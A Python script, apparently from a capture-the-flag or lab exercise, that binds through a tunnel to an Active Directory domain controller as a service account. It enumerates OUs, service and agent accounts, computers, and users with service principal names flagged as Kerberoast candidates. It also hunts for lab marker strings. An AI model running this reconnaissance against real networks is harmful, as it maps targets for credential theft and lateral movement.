#!/usr/bin/env python3
"""Enumeration LDAP via le tunnel (127.0.0.1:1389 -> DC 10.96.6.3:389)."""
import sys
from ldap3 import Server, Connection, ALL, SUBTREE

HOST = "127.0.0.1"
PORT = 1389
USER = "svc_web"
PASSWORD = "EXPURGE"
DOMAIN = "valdoria.fbi.lab"
BASE = "DC=valdoria,DC=fbi,DC=lab"

server = Server(HOST, port=PORT, get_info=ALL)

# Try multiple bind formats
bind_variants = [
    f"{USER}@{DOMAIN}",
    f"{DOMAIN}\\{USER}",
    f"CN={USER},CN=Users,{BASE}",
]

conn = None
for bv in bind_variants:
    c = Connection(server, user=bv, password=PASSWORD, auto_bind=False)
    try:
        if c.bind():
            conn = c
            print(f"[+] Bind OK : {bv}")
            break
        else:
            print(f"[-] Bind fail : {bv} -> {c.result}")
    except Exception as e:
        print(f"[-] Bind err : {bv} -> {e}")

if conn is None:
    print("[x] Aucun bind reussi")
    sys.exit(1)

def search(filterstr, attrs, base=BASE):
    conn.search(base, filterstr, SUBTREE, attributes=attrs)
    out = []
    for e in conn.entries:
        d = {}
        for a in attrs:
            try:
                v = e[a]
                d[a] = list(v) if isinstance(v, (list, set)) else [str(v)]
            except Exception:
                pass
        out.append(d)
    return out

print("\n=== Search 'Recon-Data' (any attr) ===")
for e in search("(objectClass=*)", ["cn", "name", "description", "distinguishedName", "info"]):
    for k, v in e.items():
        s = str(v)
        if "recon" in s.lower() or "SUBJ-7742" in s or "AVALD" in s.lower() or "KAPPA" in s.upper():
            print(e)
            break

print("\n=== All OUs / containers ===")
for e in search("(objectClass=organizationalUnit)", ["ou", "description", "distinguishedName"]):
    print(e)

print("\n=== Service accounts (OU=ServiceAccounts) ===")
for e in search("(objectClass=user)", ["sAMAccountName", "description", "memberOf", "servicePrincipalName", "distinguishedName"], "OU=ServiceAccounts,"+BASE):
    print(e)

print("\n=== Agents (OU=Agents) ===")
for e in search("(objectClass=user)", ["sAMAccountName", "description", "memberOf", "distinguishedName"], "OU=Agents,"+BASE):
    print(e)

print("\n=== Computers ===")
for e in search("(objectClass=computer)", ["sAMAccountName", "dNSHostName", "distinguishedName", "operatingSystem"]):
    print(e)

print("\n=== Users with SPN (Kerberoast candidates) ===")
for e in search("(&(objectClass=user)(servicePrincipalName=*))", ["sAMAccountName", "servicePrincipalName", "distinguishedName"]):
    print(e)

print("\n=== 'Recon' OU / objectClass special ===")
for e in search("(cn=*econ*)", ["cn", "objectClass", "distinguishedName", "description"]):
    print(e)

print("\n=== FIN ===")
